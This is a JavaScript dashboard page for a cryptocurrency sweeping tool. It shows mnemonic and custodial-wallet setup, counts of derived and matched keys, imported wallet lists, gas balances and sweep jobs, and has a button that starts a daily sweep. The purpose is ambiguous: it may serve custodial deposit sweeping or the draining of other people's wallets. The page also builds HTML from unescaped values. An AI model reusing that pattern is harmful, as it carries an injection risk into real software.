// Dashboard / Report page
var DashboardPage = {
    render: async function() {
        var config = {};
        var gas = {};
        var keys = {};
        var contracts = {};
        var rpcs = {};
        var wallets = {};
        var jobs = {};
        var logStats = {};
        var direct = {};

        try { config = await API.get("/api/config"); } catch (e) {}
        try { gas = await API.get("/api/gas"); } catch (e) {}
        try { keys = await API.get("/api/keys/status"); } catch (e) {}
        try { contracts = await API.get("/api/contracts"); } catch (e) {}
        try { rpcs = await API.get("/api/rpcs"); } catch (e) {}
        try { wallets = await API.get("/api/wallets/lists"); } catch (e) {}
        try { jobs = await API.get("/api/sweep/jobs"); } catch (e) {}
        try { logStats = await API.get("/api/logs/stats"); } catch (e) {}
        try { direct = await API.get("/api/direct-sweeper/status"); } catch (e) {}

        var hasMnemonic = config.hasMnemonic || false;
        var custodial = config.custodialWallet || "";
        var gw = gas.wallet;
        var totalKeys = keys.totalStored || 0;
        var matchedKeys = keys.matchedCount || 0;
        var keyStatus = keys.status || "idle";
        var contractList = contracts.contracts || [];
        var activeContracts = contractList.filter(function(c) { return c.isActive; }).length;
        var rpcList = rpcs.rpcs || [];
        var activeRpcs = rpcList.filter(function(r) { return r.isActive; }).length;
        var lists = wallets.lists || [];
        var totalWallets = 0;
        var totalMatched = 0;
        lists.forEach(function(l) {
            totalWallets += l.totalAddresses || 0;
            totalMatched += l.matchedAddresses || 0;
        });
        var jobList = jobs.jobs || [];
        var runningJobs = jobList.filter(function(j) { return j.status === "running"; }).length;
        var completedJobs = jobList.filter(function(j) { return j.status === "completed"; }).length;
        var directEnabled = !!direct.enabled;
        var directSchedule = direct.schedule || { hourUtc: 7, minuteUtc: 0 };

        var byStatus = {};
        (logStats.byStatus || []).forEach(function(s) { byStatus[s._id] = s.count; });
        var successTx = byStatus.success || 0;
        var failedTx = byStatus.failed || 0;

        var ready = hasMnemonic && custodial && gw;
        var readyColor = ready ? "var(--green)" : "var(--orange)";
        var readyText = ready ? "Ready to sweep" : "Setup incomplete";

        var html = "";

        html += '<div class="card" style="border-color:' + readyColor + '">';
        html += '<div style="display:flex;align-items:center;justify-content:space-between">';
        html += '<div><h2 style="margin-bottom:4px;color:' + readyColor + '">' + readyText + '</h2>';
        html += '<p style="color:var(--text-dim);font-size:12px">';
        html += (hasMnemonic ? "\u2713 Mnemonic" : "\u2717 Mnemonic") + " &nbsp;\u2022&nbsp; ";
        html += (custodial ? "\u2713 Custodial" : "\u2717 Custodial") + " &nbsp;\u2022&nbsp; ";
        html += (gw ? "\u2713 Gas Wallet" : "\u2717 Gas Wallet");
        html += '</p></div>';
        if (!ready) html += '<button class="btn btn-primary" onclick="App.navigate(\'setup\')">Go to Setup</button>';
        html += '</div></div>';

        html += '<div class="card">';
        html += '<div style="display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap">';
        html += '<div>';
        html += '<h2 style="margin-bottom:4px">DIRECT SWEEPER</h2>';
        html += '<p style="color:var(--text-dim);font-size:12px">Status: ' + statusBadge(directEnabled ? "active" : "pending") + ' &nbsp;•&nbsp; Daily run: ' + String(directSchedule.hourUtc).padStart(2, "0") + ':' + String(directSchedule.minuteUtc).padStart(2, "0") + ' UTC</p>';
        html += '</div>';
        if (directEnabled) {
            html += '<button class="btn btn-primary" disabled>Started (Running Forever)</button>';
        } else {
            html += '<button class="btn btn-primary" onclick="DashboardPage.startDirectSweeper()">Start DIRECT JOB</button>';
        }
        html += '</div>';
        html += '<p style="color:var(--text-dim);font-size:12px;margin-top:8px">Once started, the toggle is saved in DB. The service runs now, then waits for next daily schedule.</p>';
        html += '</div>';

        html += '<div class="stats-row">';
        html += '<div class="stat-box"><div class="value">' + formatNumber(totalKeys) + '</div><div class="label">Derived Keys</div></div>';
        html += '<div class="stat-box"><div class="value" style="color:var(--green)">' + formatNumber(matchedKeys) + '</div><div class="label">Matched</div></div>';
        html += '<div class="stat-box"><div class="value">' + formatNumber(totalWallets) + '</div><div class="label">Imported Wallets</div></div>';
        html += '<div class="stat-box"><div class="value" style="color:var(--green)">' + formatNumber(totalMatched) + '</div><div class="label">Wallet Matches</div></div>';
        html += '<div class="stat-box"><div class="value" style="color:var(--green)">' + formatNumber(successTx) + '</div><div class="label">TX Success</div></div>';
        html += '<div class="stat-box"><div class="value" style="color:var(--red)">' + formatNumber(failedTx) + '</div><div class="label">TX Failed</div></div>';
        html += '</div>';

        html += '<div class="card"><h2>Infrastructure</h2>';
        html += '<div class="stats-row">';
        html += '<div class="stat-box"><div class="value">' + activeRpcs + ' / ' + rpcList.length + '</div><div class="label">RPCs Active</div></div>';
        html += '<div class="stat-box"><div class="value">' + activeContracts + ' / ' + contractList.length + '</div><div class="label">Tokens Active</div></div>';
        html += '<div class="stat-box"><div class="value">' + lists.length + '</div><div class="label">Wallet Lists</div></div>';
        html += '<div class="stat-box"><div class="value">' + statusBadge(keyStatus) + '</div><div class="label">Derivation</div></div>';
        html += '</div></div>';

        if (gw) {
            var balRows = "";
            (gw.balances || []).forEach(function(b) {
                var bal = parseFloat(b.balanceFormatted || 0);
                var color = bal > 0 ? "var(--green)" : "var(--text-dim)";
                balRows += "<tr><td>" + b.chainName + "</td><td>" + b.chainId + '</td><td style="color:' + color + '">' + bal.toFixed(6) + "</td></tr>";
            });
            html += '<div class="card"><h2>Gas Wallet Balances</h2>';
            html += '<p style="color:var(--text-dim);font-size:12px;margin-bottom:8px">' + gw.address + ' (index ' + gw.derivationIndex + ')</p>';
            html += '<div class="table-wrap"><table>';
            html += "<thead><tr><th>Chain</th><th>ID</th><th>Balance</th></tr></thead>";
            html += "<tbody>" + (balRows || '<tr><td colspan="3" class="empty">No balances</td></tr>') + "</tbody>";
            html += '</table></div></div>';
        }

        if (jobList.length > 0) {
            var jobRows = "";
            jobList.slice(0, 5).forEach(function(j) {
                var pct = j.totalWallets > 0 ? Math.round((j.processedWallets / j.totalWallets) * 100) : 0;
                var listName = (j.listId && j.listId.name) ? j.listId.name : "\u2014";
                jobRows += "<tr><td>" + listName + "</td><td>" + statusBadge(j.status) + "</td><td>";
                jobRows += '<div class="progress-bar" style="min-width:60px"><div class="fill" style="width:' + pct + '%"></div></div>';
                jobRows += "</td><td>" + pct + "%</td>";
                jobRows += '<td style="color:var(--green)">' + (j.totalTxSent || 0) + "</td>";
                jobRows += '<td style="color:var(--red)">' + (j.totalTxFailed || 0) + "</td></tr>";
            });
            html += '<div class="card"><h2>Recent Jobs (' + runningJobs + ' running, ' + completedJobs + ' completed)</h2>';
            html += '<div class="table-wrap"><table>';
            html += "<thead><tr><th>List</th><th>Status</th><th>Progress</th><th>%</th><th>OK</th><th>Fail</th></tr></thead>";
            html += "<tbody>" + jobRows + "</tbody>";
            html += '</table></div></div>';
        }

        return html;
    },

    startDirectSweeper: async function() {
        try {
            var res = await API.post("/api/direct-sweeper/start", {});
            toast(res.message || "DIRECT SWEEPER started", "success");
            App.render();
        } catch (e) {
            toast((e && e.error) ? e.error : "Failed to start DIRECT SWEEPER", "error");
        }
    },
};